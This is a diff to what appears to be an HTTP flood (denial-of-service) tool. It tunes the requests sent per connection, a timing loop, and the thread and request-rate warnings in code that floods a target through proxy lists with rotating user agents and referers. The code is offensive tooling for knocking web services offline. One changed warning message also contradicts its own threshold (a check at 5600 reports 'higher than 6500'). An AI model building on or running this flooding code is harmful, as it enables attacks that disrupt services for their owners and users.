@@ -974,7 +974,7 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(min(self._rpc, 10000)):
+            for _ in range(min(self._rpc, 5600)):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -1007,7 +1007,7 @@ class HttpFlood(Thread):
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-                if time() > ts + 1000: break
+                if time() > ts + 800: break
         Tools.safe_close(s)
 
     def AVB(self):
@@ -1618,11 +1618,11 @@ if __name__ == '__main__':
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
 
-                if threads > 5600:
-                    logger.warning("Thread is higher than 10000")
+                if threads > 1000:
+                    logger.warning("Thread is higher than 1000")
                 if rpc > 5600:
                     logger.warning(
-                        "RPC (Request Pre Connection) is higher than 10000")
+                        "RPC (Request Pre Connection) is higher than 6500")
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
